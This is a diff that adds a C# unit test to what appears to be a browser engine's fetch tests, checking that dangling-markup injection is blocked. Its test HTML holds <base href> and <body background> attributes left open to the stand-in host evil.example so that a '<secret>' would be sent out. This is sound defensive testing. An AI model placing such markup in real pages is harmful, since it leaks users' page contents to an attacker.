@@ -259,6 +259,27 @@ public sealed class FetchTests : IDisposable
     }
 
     [Fact]
+    public void Fetch_DanglingMarkup_BaseUrlAndBodyBackground()
+    {
+        _loader.Handler = request => request.Url.StartsWith("https://evil.example/", StringComparison.Ordinal) ? new DocumentResource("") { Headers = [new("Access-Control-Allow-Origin", "*")] } : null;
+
+        // An empty URL is the base URL, whose href had a newline and a "<": it is not requested, and neither is the image of the
+        // background attribute, which a CSS value would no longer flag
+        var document = Load("""
+            <base href="https://evil.example/base?x=
+            <secret>">
+            <body background="https://evil.example/body?x=
+            <secret>">
+            <script>
+              fetch('').then(() => 'resolved', e => e.name).then(result => { document.title = result + '|' + getComputedStyle(document.body).backgroundImage + '|' + fetch('https://evil.example/absolute').then(() => {}); });
+            </script>
+            """);
+
+        Assert.Equal("TypeError|none|[object Promise]", document.Title);
+        Assert.Equal(["https://evil.example/absolute"], _loader.Requests.Select(request => request.Url).Where(url => url.StartsWith("https://evil.example/", StringComparison.Ordinal)).Distinct(StringComparer.Ordinal));
+    }
+
+    [Fact]
     public void Fetch_Abort_RejectsWithTheReason()
     {
         _loader.Responses["https://example.com/data"] = new DocumentResource("data");
